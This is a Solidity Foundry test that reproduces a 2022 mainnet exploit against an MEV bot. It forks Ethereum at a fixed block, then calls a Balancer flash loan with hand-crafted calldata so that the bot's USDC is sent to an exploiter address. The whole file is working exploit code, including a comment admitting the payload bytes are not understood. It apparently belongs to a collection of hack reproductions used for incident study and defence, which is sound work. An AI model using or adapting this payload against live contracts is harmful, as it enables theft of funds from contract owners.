// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

//  @Analysis
// https://twitter.com/BlockSecTeam/status/1580779311862190080
// https://twitter.com/AnciliaInc/status/1580705036400611328

contract ContractTest is DSTest {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant MEVBOT = 0x00000000000A47b1298f18Cf67de547bbE0D723F;
    address constant exploiter = 0x4b77c789fa35B54dAcB5F6Bb2dAAa01554299d6C;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_741_332);
    }

    function testExploit() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;
        // no idea of what of how this byte calldata works
        bytes memory userData = bytes.concat(
            abi.encode(
                0x0000000000000000000000000000000000000000000000000000000000000080,
                0x0000000000000000000000000000000000000000000000000000000000000100,
                0x0000000000000000000000000000000000000000000000000000000000000280,
                0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551,
                0x0000000000000000000000000000000000000000000000000000000000000003,
                address(WETH),
                address(USDC),
                address(WETH),
                0x0000000000000000000000000000000000000000000000000000000000000002,
                0x0000000000000000000000000000000000000000000000000000000000000040,
                0x00000000000000000000000000000000000000000000000000000000000000c0
            ),
            abi.encode(
                0x0000000000000000000000000000000000000000000000000000000000000060,
                0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a,
                0x2e9eb0ce3606eb48000000000000000000000000000000000000000000000000,
                0x0000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f5640,
                0x0000000000000000000000000000000000000000000000000000000000000064,
                0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f,
                0x27ead9083c756cc2000000000000000000000000000000000000000000000000,
                0x000000000000003d539801af4b77c789fa35b54dacb5f6bb2daaa01554299d6c,
                // 3d539801af + address(exploiter)
                0x26f2000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000002,
                0x0000000000000000000000000000000000000000000000000000000000000008,
                0x0000000000000000000000000000000000000000000000000000000000000000
            )
        );
        balancer.flashLoan(MEVBOT, tokens, amounts, userData);

        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(exploiter), 6);
    }
}
